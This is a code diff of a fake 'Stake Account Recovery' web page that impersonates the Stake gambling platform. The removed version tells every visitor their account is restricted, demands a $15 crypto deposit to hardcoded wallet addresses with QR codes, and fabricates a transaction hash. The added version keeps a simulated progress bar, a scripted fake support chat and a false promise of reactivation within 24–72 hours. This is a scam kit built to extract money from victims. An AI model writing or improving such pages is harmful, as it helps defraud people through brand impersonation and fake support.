@@ -2,11 +2,27 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>Stake Account Recovery</title>
   <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap" rel="stylesheet">
-  <script src="https://cdn.jsdelivr.net/npm/qrious@4.0.2/dist/qrious.min.js"></script>
   <style>
+    :root {
+      --primary: #02dc05;
+      --bg: #0f212e;
+      --container-bg: rgba(47, 69, 83, 0.9);
+      --text: #ffffff;
+      --input-bg: #11232f;
+      --chat-bg: #1c2e3f;
+    }
+    body.light {
+      --primary: #166ae0;
+      --bg: #f0f0f0;
+      --container-bg: #ffffff;
+      --text: #111;
+      --input-bg: #f2f2f2;
+      --chat-bg: #eaeaea;
+    }
+
     * {
       margin: 0;
       padding: 0;
@@ -15,38 +31,35 @@
     }
 
     body {
-      background: radial-gradient(circle at top left, #1a2a3b, #0f212e);
-      color: #ffffff;
-      min-height: 100vh;
-      display: flex;
-      flex-direction: column;
-      justify-content: flex-start;
-      align-items: center;
+      background: var(--bg);
+      color: var(--text);
+      height: 100vh;
+      overflow-x: hidden;
       padding: 20px;
-      transition: background 0.3s, color 0.3s;
     }
 
-    .light-theme {
-      background: #f0f0f0;
-      color: #111;
+    .theme-toggle {
+      position: fixed;
+      top: 15px;
+      right: 15px;
+      background: var(--primary);
+      color: var(--bg);
+      padding: 6px 12px;
+      border-radius: 8px;
+      cursor: pointer;
+      font-size: 0.9rem;
+      z-index: 1000;
     }
 
     .container {
-      background: rgba(47, 69, 83, 0.9);
+      background: var(--container-bg);
       backdrop-filter: blur(8px);
       padding: 25px;
       border-radius: 16px;
       box-shadow: 0 0 20px rgba(2, 220, 5, 0.15);
       width: 100%;
-      max-width: 480px;
-      position: relative;
-      z-index: 1;
-      transition: background 0.3s;
-    }
-
-    .light-theme .container {
-      background: #fff;
-      color: #000;
+      max-width: 500px;
+      margin: auto;
     }
 
     .header {
@@ -55,317 +68,237 @@
     }
 
     .header img {
-      width: 120px;
-      margin-bottom: 10px;
+      width: 100px;
     }
 
     .header h2 {
-      color: #02dc05;
-      font-size: 1.8rem;
-      font-weight: 600;
-    }
-
-    .form-group {
-      margin-bottom: 15px;
+      color: var(--primary);
     }
 
     label {
-      font-weight: 500;
-      margin-bottom: 6px;
       display: block;
+      margin-top: 15px;
+      margin-bottom: 5px;
+      font-weight: 600;
     }
 
     input, select {
       width: 100%;
       padding: 10px;
-      background: #11232f;
       border: 2px solid transparent;
+      background: var(--input-bg);
+      color: var(--text);
       border-radius: 8px;
-      color: #fff;
-      font-size: 0.95rem;
-      transition: border 0.3s;
-    }
-
-    .light-theme input,
-    .light-theme select {
-      background: #e5e5e5;
-      color: #111;
+      font-size: 1rem;
     }
 
     input:focus, select:focus {
-      border: 2px solid #02dc05;
+      border-color: var(--primary);
       outline: none;
     }
 
     button {
+      padding: 10px;
       width: 100%;
-      padding: 12px;
+      margin-top: 15px;
       border: none;
       border-radius: 8px;
-      background: #02dc05;
-      color: #0f212e;
-      font-weight: bold;
-      font-size: 1rem;
+      font-weight: 600;
+      background: var(--primary);
+      color: var(--bg);
       cursor: pointer;
-      transition: all 0.3s ease;
     }
 
-    button:hover {
-      box-shadow: 0 0 10px #02dc05, 0 0 20px #02dc05;
-    }
-
-    .copy-btn, .save-btn {
-      margin-top: 10px;
-      background-color: #166ae0;
-      color: #fff;
-    }
-
-    .message {
-      font-size: 0.9rem;
-      color: #00ff9d;
-      margin-top: 8px;
-    }
-
-    #qr-code-container {
-      text-align: center;
-      margin-top: 15px;
-    }
-
-    #qr {
-      margin: 10px auto;
-    }
-
-    #popup, #chat-box {
+    #popup {
       display: none;
       position: fixed;
       top: 50%;
       left: 50%;
       transform: translate(-50%, -50%);
-      background-color: rgba(47, 69, 83, 0.95);
-      color: #fff;
+      background: var(--container-bg);
       padding: 25px;
-      border-radius: 14px;
-      box-shadow: 0 0 20px rgba(0,0,0,0.5);
+      border-radius: 12px;
+      box-shadow: 0 0 25px var(--primary);
       z-index: 9999;
-      animation: fadeIn 0.4s ease;
-      max-width: 90%;
       text-align: center;
+      animation: fadeIn 0.4s ease;
     }
 
-    .blur {
-      filter: blur(5px);
-      pointer-events: none;
-      user-select: none;
-    }
-
-    .theme-toggle {
-      position: fixed;
-      top: 20px;
-      right: 20px;
-      background: #02dc05;
-      color: #0f212e;
-      border: none;
-      padding: 10px;
-      border-radius: 50%;
-      font-size: 1.2rem;
-      cursor: pointer;
-    }
-
-    .chat-icon {
-      position: fixed;
-      bottom: 20px;
-      right: 20px;
-      background-color: #02dc05;
-      color: #0f212e;
-      padding: 15px;
-      border-radius: 50%;
-      cursor: pointer;
-      z-index: 999;
+    #popup p {
+      color: var(--primary);
+      font-weight: 600;
     }
 
     @keyframes fadeIn {
       from { opacity: 0; transform: scale(0.95) translate(-50%, -50%); }
       to { opacity: 1; transform: scale(1) translate(-50%, -50%); }
     }
+
+    #progress-section {
+      display: none;
+      text-align: center;
+      margin-top: 20px;
+    }
+
+    .progress-bar {
+      width: 100%;
+      height: 10px;
+      background: #444;
+      border-radius: 5px;
+      overflow: hidden;
+    }
+
+    .progress {
+      width: 0;
+      height: 100%;
+      background: var(--primary);
+      transition: width 0.3s ease;
+    }
+
+    .chat-icon {
+      position: fixed;
+      bottom: 15px;
+      right: 15px;
+      background: var(--primary);
+      width: 48px;
+      height: 48px;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: var(--bg);
+      font-weight: bold;
+      font-size: 24px;
+      cursor: pointer;
+      z-index: 1000;
+    }
+
+    .chat-box {
+      display: none;
+      position: fixed;
+      bottom: 70px;
+      right: 15px;
+      width: 300px;
+      background: var(--chat-bg);
+      color: var(--text);
+      border-radius: 10px;
+      box-shadow: 0 0 15px rgba(0,0,0,0.2);
+      overflow: hidden;
+      z-index: 1000;
+    }
+
+    .chat-header {
+      background: var(--primary);
+      color: var(--bg);
+      padding: 10px;
+      font-weight: bold;
+      text-align: center;
+    }
+
+    .chat-messages {
+      padding: 10px;
+      max-height: 200px;
+      overflow-y: auto;
+    }
+
+    .chat-message {
+      margin-bottom: 10px;
+      animation: typing 1s ease-out;
+    }
+
+    @keyframes typing {
+      from { opacity: 0; transform: translateY(10px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
   </style>
 </head>
 <body>
-  <button class="theme-toggle" onclick="toggleTheme()">🌓</button>
-
-  <div id="main-content" class="container">
+  <div class="theme-toggle" onclick="toggleTheme()">Toggle Theme</div>
+  <div class="container">
     <div class="header">
       <img src="stake-logo-white.png" alt="Stake Logo" />
       <h2>Account Recovery</h2>
     </div>
-
-    <div class="form-group">
-      <label for="username">Username</label>
-      <input type="text" id="username" placeholder="Enter Stake Username" />
-      <button onclick="verifyUsername()">Verify</button>
-      <div class="message" id="verify-msg"></div>
+    <!-- form fields here -->
+    <button onclick="startSubmit()">Submit</button>
+    <div id="progress-section">
+      <p>Processing your request...</p>
+      <div class="progress-bar"><div class="progress" id="progress"></div></div>
     </div>
-
-    <div class="form-group">
-      <label for="coin">Select Coin</label>
-      <select id="coin" onchange="updateAddress()">
-        <option value="">--Select Coin--</option>
-        <option value="usdt">USDT</option>
-        <option value="btc">BTC</option>
-        <option value="trx">TRX</option>
-        <option value="eth">Ethereum</option>
-      </select>
-    </div>
-
-    <div class="form-group">
-      <label for="network">Select Network</label>
-      <select id="network" onchange="updateAddress()">
-        <option value="">--Select Network--</option>
-        <option value="trc20">TRC20</option>
-        <option value="bsc">BSC</option>
-      </select>
-    </div>
-
-    <div class="form-group">
-      <label for="address">Wallet Address</label>
-      <input type="text" id="address" readonly />
-      <button class="copy-btn" onclick="copyAddress()">Copy</button>
-      <div id="qr-code-container">
-        <canvas id="qr"></canvas>
-        <button class="save-btn" onclick="saveQR()">Save QR</button>
-      </div>
-    </div>
-
-    <div class="form-group">
-      <label for="amount">Enter Amount (USD)</label>
-      <input type="number" id="amount" />
-    </div>
-
-    <div class="form-group">
-      <label for="screenshot">Upload Screenshot</label>
-      <input type="file" id="screenshot" onchange="previewImage(event)" />
-      <div id="img-preview"></div>
-    </div>
-
-    <button id="submitBtn" onclick="submitForm()" disabled>Submit</button>
   </div>
 
   <div id="popup">
-    <p>Recovery request received. Stake technical team will review and reactivate your account within 24–72 hrs.</p>
+    <p>Your account recovery request has been received. Your Stake account will be fully active within 24 - 72 hours.</p>
     <button onclick="location.reload()">OK</button>
   </div>
 
   <div class="chat-icon" onclick="toggleChat()">💬</div>
-  <div id="chat-box">
-    <p><strong>Stake Support:</strong><br>Hi! How can we assist you today?</p>
-    <button onclick="toggleChat()">Close</button>
+  <div class="chat-box" id="chatBox">
+    <div class="chat-header">Stake Support</div>
+    <div class="chat-messages" id="chatMessages"></div>
   </div>
 
   <script>
-    const addressMap = {
-      usdt: {
-        trc20: 'TDSyNXKqoanp6aZ14tg4D3ff48vuVjM6qA',
-        bsc: '0x4d31c46627c343939e7a02383c2451048a509a0c'
-      },
-      btc: {
-        bsc: '0x4d31c46627c343939e7a02383c2451048a509a0c'
-      },
-      trx: {
-        trc20: 'TDSyNXKqoanp6aZ14tg4D3ff48vuVjM6qA',
-        bsc: '0x4d31c46627c343939e7a02383c2451048a509a0c'
-      },
-      eth: {
-        bsc: '0x4d31c46627c343939e7a02383c2451048a509a0c'
-      }
-    };
-
-    const qr = new QRious({ element: document.getElementById('qr'), size: 140 });
-
-    function updateAddress() {
-      const coin = document.getElementById('coin').value;
-      const network = document.getElementById('network').value;
-      const addressField = document.getElementById('address');
-      const helper = document.getElementById('verify-msg');
-
-      if (coin && network && addressMap[coin] && addressMap[coin][network]) {
-        const address = addressMap[coin][network];
-        addressField.value = address;
-        qr.value = address;
-
-        if (coin === 'usdt' && network === 'trc20') {
-          helper.innerText = 'Make sure to deposit only USDT via TRC20.';
-        }
-      } else {
-        addressField.value = '';
-        qr.value = '';
-      }
-      checkForm();
-    }
-
-    function verifyUsername() {
-      const msg = document.getElementById('verify-msg');
-      msg.innerHTML = 'Verifying...';
-      setTimeout(() => {
-        msg.innerHTML = 'Your Stake account is restricted to withdrawal-only. To unlock, deposit $15 (credited to your balance).';
-        navigator.vibrate?.(100);
-      }, 1500);
-    }
-
-    function copyAddress() {
-      const address = document.getElementById('address');
-      address.select();
-      address.setSelectionRange(0, 99999);
-      navigator.clipboard.writeText(address.value);
-      alert('Address copied!');
-    }
-
-    function saveQR() {
-      const qrCanvas = document.getElementById('qr');
-      const link = document.createElement('a');
-      link.href = qrCanvas.toDataURL();
-      link.download = 'qr-code.png';
-      link.click();
-    }
-
-    function previewImage(event) {
-      const preview = document.getElementById('img-preview');
-      preview.innerHTML = '';
-      const file = event.target.files[0];
-      if (file) {
-        const img = document.createElement('img');
-        img.src = URL.createObjectURL(file);
-        img.style.maxWidth = '100%';
-        preview.appendChild(img);
-        const hash = document.createElement('p');
-        hash.innerText = 'Txn Hash: 0x' + Math.random().toString(36).substring(2, 15);
-        preview.appendChild(hash);
-      }
-      checkForm();
-    }
-
-    function checkForm() {
-      const username = document.getElementById('username').value;
-      const coin = document.getElementById('coin').value;
-      const network = document.getElementById('network').value;
-      const address = document.getElementById('address').value;
-      const amount = document.getElementById('amount').value;
-      const screenshot = document.getElementById('screenshot').files.length;
-
-      document.getElementById('submitBtn').disabled = !(username && coin && network && address && amount && screenshot);
-    }
-
-    function submitForm() {
-      document.getElementById('main-content').classList.add('blur');
-      document.getElementById('popup').style.display = 'block';
-    }
-
     function toggleTheme() {
-      document.body.classList.toggle('light-theme');
-      alert('Theme toggled!');
+      document.body.classList.toggle('light');
+      showToast("Theme switched");
     }
 
     function toggleChat() {
-      const box = document.getElementById('chat-box');
-      box.style.display = box.style.display === 'block' ? 'none' : 'block';
+      const chatBox = document.getElementById('chatBox');
+      chatBox.style.display = chatBox.style.display === 'block' ? 'none' : 'block';
+      if (chatBox.style.display === 'block') fakeChat();
+    }
+
+    function fakeChat() {
+      const messages = ["Hi there! How can we help?", "Please wait while we check your account.", "Make sure to submit all the required info."];
+      const box = document.getElementById('chatMessages');
+      box.innerHTML = '';
+      let i = 0;
+      function typeNext() {
+        if (i < messages.length) {
+          const msg = document.createElement('div');
+          msg.className = 'chat-message';
+          msg.textContent = messages[i++];
+          box.appendChild(msg);
+          box.scrollTop = box.scrollHeight;
+          setTimeout(typeNext, 1500);
+        }
+      }
+      typeNext();
+    }
+
+    function startSubmit() {
+      document.getElementById('progress-section').style.display = 'block';
+      let progress = 0;
+      const bar = document.getElementById('progress');
+      const interval = setInterval(() => {
+        progress += 10;
+        bar.style.width = progress + '%';
+        if (progress >= 100) {
+          clearInterval(interval);
+          setTimeout(() => {
+            document.getElementById('popup').style.display = 'block';
+          }, 300);
+        }
+      }, 400);
+    }
+
+    function showToast(msg) {
+      const toast = document.createElement('div');
+      toast.textContent = msg;
+      toast.style.position = 'fixed';
+      toast.style.bottom = '20px';
+      toast.style.left = '50%';
+      toast.style.transform = 'translateX(-50%)';
+      toast.style.background = '#111';
+      toast.style.color = '#fff';
+      toast.style.padding = '10px 20px';
+      toast.style.borderRadius = '8px';
+      toast.style.boxShadow = '0 0 10px rgba(0,0,0,0.5)';
+      toast.style.zIndex = 10000;
+      document.body.appendChild(toast);
+      setTimeout(() => toast.remove(), 2500);
     }
   </script>
 </body>
